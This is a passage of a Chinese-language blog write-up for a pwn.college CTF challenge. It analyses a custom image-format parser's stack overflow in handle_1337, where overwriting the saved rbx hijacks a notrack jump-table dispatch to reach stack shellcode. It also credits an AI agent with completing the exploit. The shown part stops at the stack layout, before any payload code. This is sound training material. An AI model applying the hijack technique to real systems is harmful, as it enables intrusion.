@@ -1,0 +1,1496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#ff3e3e" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#ff3e3e" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
+<link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/safari_pinned_tab.svg" color="#ff3e3e">
+  <meta name="google-site-verification" content="ixJcuHIxOAn36hBu980PgJYFR9hLoktNwfEAAimupCI">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&family=Italianno:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&family=JetBrains+Mono:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.31/dist/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"vkkkv.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.27.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"hide","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"base16/tomorrow-night","dark":"base16/tomorrow-night"},"prism":{"light":"prism-tomorrow","dark":"prism-tomorrow"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":false,"color":"#ff3e3e","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"disqus","storage":true,"lazyload":false,"nav":null,"activeClass":"disqus"},"stickytabs":false,"motion":{"enable":true,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/config.min.js" defer></script>
+
+    <meta name="description" content="后记(前记？) 这道题卡了两个月。之前分析时已经定位到了 handle_1337 的栈溢出、渲染旋转、saved rbx 偏移——几乎所有拼图都在，但 exploit 始终 SIGSEGV。反复调偏移、怀疑 SHSTK、怀疑 read_exact 破坏了跳转表。 最终是 Hermes（运行 deepseek-v4-pro ）接手后，从零重建了调试流程，先用 exit(42) 确认代码执行可达，再用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PwnCollege - Integrated Security - CIMG Screenshots">
+<meta property="og:url" content="https://vkkkv.github.io/wp/PwnCollege/PwnCollege-is-cimg-screenshots/">
+<meta property="og:site_name" content="Hello Navi">
+<meta property="og:description" content="后记(前记？) 这道题卡了两个月。之前分析时已经定位到了 handle_1337 的栈溢出、渲染旋转、saved rbx 偏移——几乎所有拼图都在，但 exploit 始终 SIGSEGV。反复调偏移、怀疑 SHSTK、怀疑 read_exact 破坏了跳转表。 最终是 Hermes（运行 deepseek-v4-pro ）接手后，从零重建了调试流程，先用 exit(42) 确认代码执行可达，再用">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-05-20T06:30:00.000Z">
+<meta property="article:modified_time" content="2026-05-20T08:37:41.001Z">
+<meta property="article:author" content="vkkkv">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="pwncollege">
+<meta property="article:tag" content="reverse">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://vkkkv.github.io/wp/PwnCollege/PwnCollege-is-cimg-screenshots/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://vkkkv.github.io/wp/PwnCollege/PwnCollege-is-cimg-screenshots/","path":"wp/PwnCollege/PwnCollege-is-cimg-screenshots/","title":"PwnCollege - Integrated Security - CIMG Screenshots"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>PwnCollege - Integrated Security - CIMG Screenshots | Hello Navi</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2L68NKWCGZ"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-2L68NKWCGZ","only_pageview":false,"measure_protocol_api_secret":null}</script>
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/third-party/analytics/google-analytics.min.js" defer></script>
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/@next-theme/pjax@0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.31/dist/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/lozad@1.16.0/dist/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/pangu@7.2.0/dist/browser/pangu.umd.js" integrity="sha256-JnmRRnJK7DC6RQJbAJb6AXOM9OmWzS6z8eYultk/48Y=" crossorigin="anonymous" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/utils.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/motion.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/sidebar.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/next-boot.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/pjax.min.js" defer></script>
+
+  <script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.5.0/dist/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/third-party/search/local-search.min.js" defer></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdn.jsdelivr.net/npm/mermaid@11.10.1/dist/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/third-party/tags/mermaid.min.js" defer></script>
+
+  <script class="next-config" data-name="wavedrom" type="application/json">{"enable":true,"js":{"url":"https://cdn.jsdelivr.net/npm/wavedrom@3.5.0/wavedrom.min.js","integrity":"sha256-INLAoJc6quTNfiMWkGZniYO2cxE8mHpddnLow1m6RFs="}}</script>
+  <script class="next-config" data-name="wavedrom_skin" type="application/json">{"enable":true,"js":{"url":"https://cdn.jsdelivr.net/npm/wavedrom@3.5.0/skins/default.js","integrity":"sha256-fduc/Zszk5ezWws2uInY/ALWVmIrmV6VTgXbsYSReFI="}}</script>
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/third-party/tags/wavedrom.min.js" defer></script>
+
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/third-party/fancybox.min.js" defer></script>
+
+
+
+  
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/third-party/math/mathjax.min.js" defer></script>
+
+
+  <script src="https://cdn.jsdelivr.net/npm/quicklink@3.0.1/dist/quicklink.umd.js" integrity="sha256-44BednzIpUeQJcY8qtLyarFu0UCCTbgmWOvaoehiFQQ=" crossorigin="anonymous" defer></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://vkkkv.github.io/wp/PwnCollege/PwnCollege-is-cimg-screenshots/"}</script>
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/third-party/quicklink.min.js" defer></script>
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<style type="text/css">
+.spoiler {
+  display: inline;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><link rel="alternate" href="/atom.xml" title="Hello Navi" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hello Navi" type="application/rss+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hello Navi</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Tech, Security & Personal Notes</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0%E5%89%8D%E8%AE%B0"><span class="nav-number">1.</span> <span class="nav-text">后记(前记？)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9D%E6%AD%A5%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">1. 初步分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BB%93%E6%9E%84"><span class="nav-number">3.</span> <span class="nav-text">2. 二进制结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9Ehandle_1337-%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">4.</span> <span class="nav-text">3. 漏洞：handle_1337 栈溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E6%B5%81%E4%B8%8E%E6%97%8B%E8%BD%AC"><span class="nav-number">5.</span> <span class="nav-text">4. 数据流与旋转</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E6%97%8B%E8%BD%AC"><span class="nav-number">5.1.</span> <span class="nav-text">验证旋转</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-%E5%B8%83%E5%B1%80"><span class="nav-number">6.</span> <span class="nav-text">5. Payload 布局</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode"><span class="nav-number">7.</span> <span class="nav-text">6. Shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%8E%86%E7%A8%8B"><span class="nav-number">8.</span> <span class="nav-text">7. 调试历程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E5%81%8F%E7%A7%BB%E6%A0%A1%E5%87%86"><span class="nav-number">8.1.</span> <span class="nav-text">7.1 栈偏移校准</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%8B%E8%BD%AC%E9%AA%8C%E8%AF%81"><span class="nav-number">8.2.</span> <span class="nav-text">7.2 旋转验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode-%E8%B0%83%E8%AF%95exit42-%E6%B5%8B%E8%AF%95"><span class="nav-number">8.3.</span> <span class="nav-text">7.3 Shellcode
+调试：exit(42) 测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode-%E8%B0%83%E8%AF%95rax-%E6%B1%A1%E6%9F%93"><span class="nav-number">8.4.</span> <span class="nav-text">7.4 Shellcode 调试：rax 污染</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4-exploit"><span class="nav-number">9.</span> <span class="nav-text">8. 完整 Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E8%A6%81%E7%82%B9"><span class="nav-number">10.</span> <span class="nav-text">9. 关键要点</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="vkkkv"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">vkkkv</p>
+  <div class="site-description" itemprop="description">A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">215</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">151</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1ZLS0tW" title="github → https:&#x2F;&#x2F;github.com&#x2F;VKKKV"><i class="fab fa-github fa-fw"></i></span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+<script>
+(function() {
+  const initAvatarHUD = () => {
+    const img = document.querySelector('.site-author-image');
+    if (!img || img.closest('.avatar-hud-frame')) return;
+
+    const frame = document.createElement('div');
+    frame.className = 'avatar-hud-frame';
+
+    img.replaceWith(frame);
+    frame.appendChild(img);
+
+    // 注入十字准星 (上下左右)
+    ['top', 'bottom', 'left', 'right'].forEach(dir => {
+      const line = document.createElement('div');
+      line.className = `hud-crosshair crosshair-${dir}`;
+      frame.appendChild(line);
+    });
+
+    // 注入外层红色虚线环
+    const outerRing = document.createElement('div');
+    outerRing.className = 'hud-outer-ring';
+    frame.appendChild(outerRing);
+    
+    // 注入内层深色装饰环
+    const innerRing = document.createElement('div');
+    innerRing.className = 'hud-inner-ring';
+    frame.appendChild(innerRing);
+  };
+
+  const initHeader = () => {
+    const brand = document.querySelector('.brand');
+    if (!brand || brand.querySelector('.cyber-underline')) return;
+
+    // 重构标题文字：拆分为两个 span 以便分别着色
+    const title = brand.querySelector('.site-title');
+    if (title) {
+      title.innerHTML = '<span class="text-white">Hello</span><span class="text-red">Navi</span>';
+    }
+
+    // 注入战术下划线 (Cyber Underline)
+    const underline = document.createElement('div');
+    underline.className = 'cyber-underline';
+    underline.innerHTML = `
+      <div class="line-red"></div>
+      <div class="line-dark"></div>
+      <div class="line-dashes">
+        <i></i><i></i><i></i><i></i><i></i>
+      </div>
+    `;
+    brand.appendChild(underline);
+  };
+
+  const initBackToTop = () => {
+    const btn = document.querySelector('.badge-normal');
+    if (!btn || btn.dataset.hooked) return;
+
+    btn.addEventListener('click', () => {
+      window.scrollTo({
+        top: 0,
+        behavior: 'smooth'
+      });
+    });
+    btn.dataset.hooked = 'true';
+  };
+
+  const updateTacticalBus = () => {
+    const progressBar = document.getElementById('busProgress');
+    if (!progressBar) return;
+
+    const scrollTop = window.scrollY || document.documentElement.scrollTop;
+    const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+    
+    if (scrollHeight <= 0) {
+      progressBar.style.height = '0%';
+      return;
+    }
+
+    const scrollPercent = Math.min(100, Math.max(0, (scrollTop / scrollHeight) * 100));
+    progressBar.style.height = `${scrollPercent}%`;
+  };
+
+  const initAll = () => {
+    initAvatarHUD();
+    initHeader();
+    initBackToTop();
+    
+    // 初始化总线并监听滚动
+    updateTacticalBus();
+    window.removeEventListener('scroll', updateTacticalBus);
+    window.addEventListener('scroll', updateTacticalBus, { passive: true });
+  };
+
+  // 核心修复：确保初始加载时 DOM 完全就绪后再运行
+  if (document.readyState === 'loading') {
+    window.addEventListener('load', initAll);
+  } else {
+    initAll();
+  }
+  
+  document.addEventListener('pjax:success', initAll);
+})();
+</script>
+
+        </div>
+      </div>
+    </div>
+
+    
+        <div class="pjax">
+        </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/PwnCollege/PwnCollege-is-cimg-screenshots/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="PwnCollege - Integrated Security - CIMG Screenshots | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PwnCollege - Integrated Security - CIMG Screenshots
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-05-20 14:30:00 / Modified: 16:37:41" itemprop="dateCreated datePublished" datetime="2026-05-20T14:30:00+08:00">2026-05-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/PwnCollege/PwnCollege-is-cimg-screenshots/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/PwnCollege/PwnCollege-is-cimg-screenshots/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="后记前记">后记(前记？)</h2>
+<p>这道题卡了两个月。之前分析时已经定位到了 handle_1337
+的栈溢出、渲染旋转、saved rbx 偏移——几乎所有拼图都在，但 exploit 始终
+SIGSEGV。反复调偏移、怀疑 SHSTK、怀疑 read_exact 破坏了跳转表。</p>
+<p>最终是 Hermes（运行 deepseek-v4-pro
+）接手后，从零重建了调试流程，先用 <code>exit(42)</code>
+确认代码执行可达，再用 <code>write("WORKS\n")</code> 验证 syscall。</p>
+<p>从 Hermes 接入到拿到 flag，大概花了一小时。其中四十分钟在修写错的
+jmp/call 偏移和 shellcode ，真正定位只用了十分钟。</p>
+<p>AI Agent 在 exploit
+开发中的真正价值不在于「比人更懂二进制」，而在于不知疲倦地迭代测试、不跳过任何基础验证步骤。人会累、会跳步、会陷入思维定式，Agent
+不会。</p>
+<blockquote>
+<p>一个自定义图片格式解析器，包含栈溢出漏洞。通过覆盖 saved rbx 劫持
+notrack jmp 分发，跳转到栈上 shellcode 读取 /flag。</p>
+</blockquote>
+<p>挑战地址：<code>ssh hacker@dojo.pwn.college</code>，二进制在
+<code>/challenge/integration-cimg-screenshot-sc</code>。</p>
+<h2 id="初步分析">1. 初步分析</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ checksec /challenge/integration-cimg-screenshot-sc</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br></pre></td></tr></table></figure>
+<ul>
+<li>无 canary、无 PIE、栈可执行</li>
+<li>SHSTK（影子栈）和 IBT（间接分支追踪）启用</li>
+<li>ASLR 被二进制内部禁用（<code>personality(ADDR_NO_RANDOMIZE)</code> +
+<code>execve("/proc/self/exe")</code>）</li>
+</ul>
+<h2 id="二进制结构">2. 二进制结构</h2>
+<p>二进制处理自定义的 <code>.cimg</code> 图片格式，包含 7 个主要
+handler：</p>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>从 stdin 读取原始像素数据</td>
+</tr>
+<tr>
+<td>2</td>
+<td>从 stdin 读取 ANSI 格式数据</td>
+</tr>
+<tr>
+<td>3</td>
+<td>从 stdin 读取 RGBA 数据</td>
+</tr>
+<tr>
+<td>4</td>
+<td>将 sprite 渲染到帧缓冲区</td>
+</tr>
+<tr>
+<td>5</td>
+<td>从文件加载 sprite</td>
+</tr>
+<tr>
+<td>6</td>
+<td>显示帧缓冲区</td>
+</tr>
+<tr>
+<td>7</td>
+<td>睡眠</td>
+</tr>
+<tr>
+<td>1337</td>
+<td>从帧缓冲区截取 sprite 区域</td>
+</tr>
+</tbody>
+</table>
+<p><strong>指令分发机制</strong>（位于 <code>main</code>
+的循环中）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; rbx = 跳转表基址 (0x403478)</span><br><span class="line">; ecx = 指令码 - 2</span><br><span class="line">movsxd rax, dword [rbx + rcx*4]   ; 从跳转表读取有符号偏移</span><br><span class="line">add    rax, rbx                     ; rax = 跳转表基址 + 偏移 = handler 地址</span><br><span class="line">notrack jmp rax                    ; 跳转到 handler</span><br></pre></td></tr></table></figure>
+<p><code>notrack</code> 前缀绕过了 IBT（不需要 <code>endbr64</code>
+目标），这为劫持提供了条件。</p>
+<h2 id="漏洞handle_1337-栈溢出">3. 漏洞：handle_1337 栈溢出</h2>
+<p><code>handle_1337</code> 从帧缓冲区截取 <code>w * h</code>
+字节到栈缓冲区：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sub    rsp, 0x98          ; 分配 152 字节栈帧</span><br><span class="line">lea    rsi, [rsp+0x0b]   ; 读取 5 字节参数</span><br><span class="line">call   read_exact</span><br><span class="line">lea    rdi, [rsp+0x10]   ; 截屏缓冲区起始</span><br><span class="line">; ... 循环：for row; for col: buffer[row*w + col] = framebuffer[...]</span><br><span class="line">add    rsp, 0x98</span><br><span class="line">pop    rbx               ; ← saved rbx 恢复</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>栈布局（从低地址到高）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rsp+0x00: 参数区（sprite_id, x, y, w, h 等）</span><br><span class="line">rsp+0x10: 截屏缓冲区（136 字节）</span><br><span class="line">rsp+0x98: saved rbx    ← 溢出目标</span><br><span class="line">rsp+0xa0: saved rbp</span><br><span class="line">rsp+0xa8: saved r12</span><br><span class="line">rsp+0xb0: saved r13</span><br><span class="line">rsp+0xb8: 返回地址</span><br></pre></td></tr></table></figure>
